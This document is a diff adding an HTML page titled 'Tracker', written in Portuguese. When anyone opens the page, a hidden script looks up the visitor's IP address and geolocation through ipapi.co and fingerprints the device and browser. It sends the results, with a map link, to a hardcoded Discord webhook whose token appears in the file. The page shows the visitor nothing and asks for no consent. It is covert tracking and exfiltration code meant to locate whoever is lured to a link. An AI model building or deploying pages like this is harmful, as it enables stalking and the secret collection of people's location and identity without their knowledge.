@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Tracker</title>
+</head>
+<body>
+
+<script>
+const webhook = "https://discord.com/api/webhooks/1485070612715143234/2ueFN6y6rNDwgLzYAKccyiYyXow9k9QiavKJYD9n8P_mGalX7OzVwjxB9nrokOWWakVF";
+
+// 📱 detectar dispositivo
+function detectar(){
+  const ua = navigator.userAgent;
+
+  return {
+    device: /Android/i.test(ua) ? "Android 📱" :
+            /iPhone/i.test(ua) ? "iPhone 📱" : "Desktop 💻",
+
+    browser: /Chrome/i.test(ua) ? "Chrome 🌐" :
+             /Firefox/i.test(ua) ? "Firefox 🦊" :
+             /Safari/i.test(ua) ? "Safari 🍎" : "Outro",
+
+    ua
+  };
+}
+
+// 🧬 fingerprint leve (limitado)
+function fingerprint(){
+  const raw = [
+    navigator.userAgent,
+    navigator.language,
+    screen.width,
+    screen.height
+  ].join("|");
+
+  return btoa(raw).substring(0,120); // LIMITADO
+}
+
+// 🚀 coleta + envio
+fetch("https://ipapi.co/json/")
+.then(r => r.json())
+.then(data => {
+
+  const d = detectar();
+  const fp = fingerprint();
+
+  const mapa = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
+  fetch(webhook,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+
+      username:"🛰️ Tracker System",
+
+      embeds:[{
+        title:"🧠 Novo acesso detectado",
+        color: 65280,
+
+        fields:[
+          {
+            name:"🌐 IP",
+            value: String(data.ip || "N/A"),
+            inline:true
+          },
+          {
+            name:"📍 Localização",
+            value:`${data.city || "?"}, ${data.country_name || "?"}`,
+            inline:true
+          },
+          {
+            name:"💻 Dispositivo",
+            value:d.device,
+            inline:true
+          },
+          {
+            name:"🌐 Navegador",
+            value:d.browser,
+            inline:true
+          },
+          {
+            name:"🗺️ Mapa",
+            value:`[Abrir localização](${mapa})`
+          },
+          {
+            name:"🧬 Fingerprint",
+            value:"```" + fp + "```"
+          }
+        ],
+
+        image:{
+          url:`https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=600&height=300&center=lonlat:${data.longitude},${data.latitude}&zoom=10&marker=lonlat:${data.longitude},${data.latitude};color:red`
+        },
+
+        footer:{
+          text:"Sistema estável • sem erros"
+        },
+
+        timestamp:new Date().toISOString()
+      }]
+    })
+  })
+  .then(r => console.log("Enviado:", r.status))
+  .catch(e => console.log("Erro:", e));
+
+});
+</script>
+
+</body>
+</html>
